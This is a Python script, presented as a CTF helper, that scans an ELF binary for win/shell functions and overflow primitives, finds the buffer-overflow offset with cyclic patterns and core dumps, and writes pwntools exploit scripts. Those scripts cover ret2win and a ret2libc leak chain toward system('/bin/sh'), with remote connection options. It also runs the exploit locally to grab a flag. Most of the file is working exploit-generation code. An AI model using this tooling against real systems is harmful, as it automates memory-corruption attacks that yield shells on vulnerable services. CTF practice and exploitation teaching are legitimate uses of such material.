#!/usr/bin/env python3
"""Standalone pwn analyzer + ret2win scaffold generator.

Finds a win()/flag()/backdoor() function and an overflow primitive in an ELF,
auto-detects the buffer-overflow offset with a cyclic pattern + core dump, emits
a ready pwntools exploit to <workdir>/exploit.py, and — for a LOCAL binary —
runs it once to try to capture the flag. Authorized CTF use only.

    python3 pwn_scaffold.py <binary> <workdir>
"""
import os
import re
import sys


def main():
    if len(sys.argv) < 3:
        print("USAGE: pwn_scaffold.py <binary> <workdir>")
        return 2
    path, workdir = sys.argv[1], sys.argv[2]
    try:
        from pwn import context, ELF, process, cyclic, cyclic_find
    except Exception as e:
        print(f"PWNTOOLS_UNAVAILABLE {e}")
        return 2
    context.log_level = "error"
    try:
        e = ELF(path, checksec=False)
        context.binary = e          # ensure correct arch/bits for payloads
    except Exception as ex:
        print(f"LOAD_FAILED {ex}")
        return 2

    # 1) win function
    win_name, win_addr = None, None
    for name, addr in e.symbols.items():
        n = name.lower()
        if any(k in n for k in ("win", "flag", "backdoor", "print_flag",
                                "get_shell", "give_shell", "shell", "secret")):
            if addr and addr > 0x1000:
                win_name, win_addr = name, addr
                break
    # 2) overflow primitive
    prims = [s for s in ("gets", "read", "scanf", "__isoc99_scanf", "fgets",
                         "strcpy", "memcpy") if s in e.plt or s in e.symbols]

    # 3) auto offset via cyclic + core dump (local run)
    offset = None
    try:
        os.makedirs(workdir, exist_ok=True)
        prev = os.getcwd()
        os.chdir(workdir)
        try:
            p = process(path)
            p.sendline(cyclic(400))
            p.wait(timeout=5)
            core = p.corefile
            if core:
                if context.bits == 64:
                    val = core.read(core.rsp, 8).rstrip(b"\x00")
                    offset = cyclic_find(val[:4]) if val else None
                    if offset is None or offset < 0:
                        offset = cyclic_find(core.fault_addr & 0xffffffff)
                else:
                    offset = cyclic_find(core.fault_addr)
            p.close()
        finally:
            os.chdir(prev)
    except Exception:
        offset = None

    # Check for puts / printf for ret2libc leak chain when win() is absent
    has_puts = "puts" in e.plt or "puts" in e.symbols
    has_printf = "printf" in e.plt or "printf" in e.symbols
    main_addr = e.symbols.get("main", None)

    off_str = str(offset) if (offset is not None and offset >= 0) else "OFFSET  # TODO: find via cyclic"
    win_str = hex(win_addr) if win_addr else "0x0  # TODO: set win() address"
    align = ("    payload += p64(ret)          # movaps stack alignment (64-bit)\n"
             if context.bits == 64 else "")

    if win_addr:
        script = f'''#!/usr/bin/env python3
from pwn import *
context.binary = exe = ELF({path!r}, checksec=False)
try: ret = next(exe.search(asm("ret"), executable=True))
except Exception: ret = 0
def conn():
    return remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else process(exe.path)
io = conn()
off = {off_str}
payload  = b"A" * off
{align}payload += p64({win_str}) if context.bits == 64 else p32({win_str})
io.sendline(payload)
io.interactive()
'''
    elif has_puts and main_addr and context.bits == 64:
        # 64-bit ret2libc scaffold with pop rdi; ret gadget
        script = f'''#!/usr/bin/env python3
# Auto-generated ret2libc exploit template
from pwn import *
context.binary = exe = ELF({path!r}, checksec=False)
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
try: ret = next(exe.search(asm("ret"), executable=True))
except Exception: ret = pop_rdi + 1

def conn():
    return remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else process(exe.path)

io = conn()
off = {off_str}

# Stage 1: Leak puts@got and loop back to main
payload1 = b"A" * off
payload1 += p64(pop_rdi)
payload1 += p64(exe.got['puts'])
payload1 += p64(exe.plt['puts'])
payload1 += p64({hex(main_addr)})
io.sendline(payload1)

leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
print(f"[*] Leaked puts: {{hex(leak)}}")

# Stage 2: Calculate libc base & invoke system('/bin/sh')
# libc = ELF("./libc.so.6")  # adjust libc version
# libc.address = leak - libc.symbols['puts']
# payload2 = b"A" * off + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols['system'])
# io.sendline(payload2)
io.interactive()
'''
    else:
        script = f'''#!/usr/bin/env python3
from pwn import *
context.binary = exe = ELF({path!r}, checksec=False)
def conn():
    return remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else process(exe.path)
io = conn()
off = {off_str}
payload = b"A" * off
io.sendline(payload)
io.interactive()
'''

    out = os.path.join(workdir, "exploit.py")
    try:
        with open(out, "w") as fh:
            fh.write(script)
    except OSError:
        out = "(could not write)"

    print("WIN:", win_name, win_str)
    print("PRIMITIVES:", ", ".join(prims) or "none obvious")
    if not win_addr and has_puts:
        print("EXPLOIT_TYPE: ret2libc leak chain generated")
    print("OFFSET:", offset if offset is not None else "not auto-found")
    print("SCRIPT:", out)

    # 4) local capture attempt if we have both offset and win
    if win_addr and offset is not None and offset >= 0:
        try:
            from pwn import process as _proc, p64, p32, asm
            prev = os.getcwd(); os.chdir(workdir)
            try:
                io = _proc(path)
                ret = 0
                try:
                    ret = next(e.search(asm("ret"), executable=True))
                except Exception:
                    ret = 0
                pay = b"A" * offset
                if context.bits == 64:
                    if ret:
                        pay += p64(ret)
                    pay += p64(win_addr)
                else:
                    pay += p32(win_addr)
                io.sendline(pay)
                import time as _t; _t.sleep(0.3)
                data = io.recvall(timeout=5)
                io.close()
                m = re.search(rb"[A-Za-z0-9_]{2,20}\{[^}]{2,120}\}", data)
                if m:
                    print("CAPTURED:", m.group(0).decode("latin-1", "replace"))
                else:
                    print("LOCAL_RUN_OUTPUT:", data[:400].decode("latin-1", "replace"))
            finally:
                os.chdir(prev)
        except Exception as ex:
            print(f"LOCAL_RUN_ERROR {ex}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
